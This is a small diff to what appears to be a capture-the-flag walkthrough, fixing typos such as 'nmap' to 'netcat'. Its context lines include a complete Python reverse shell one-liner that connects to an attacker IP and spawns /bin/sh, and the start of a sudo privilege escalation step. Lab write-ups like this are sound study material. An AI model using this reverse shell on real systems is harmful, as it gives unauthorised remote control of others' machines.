@@ -44,7 +44,7 @@ After launching gobuster, we get that the reverse shell is at the following path
 
 ![webshell](/assets/img/2020-10-21-18-52-17.png)
 
-There we can run a basic python reverse shell to our machine. Do not forget to set up nmap on our host!
+There we can run a basic python reverse shell to our machine. Do not forget to set up netcat on our host!
 
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.33",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -52,7 +52,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ## Privilege escalation
 
-If we check with sudo we can see that we can run any comand as the user `scriptmanager`
+If we check with sudo we can see that we can run any command as the user `scriptmanager`
 
 ```console
 $ sudo -l
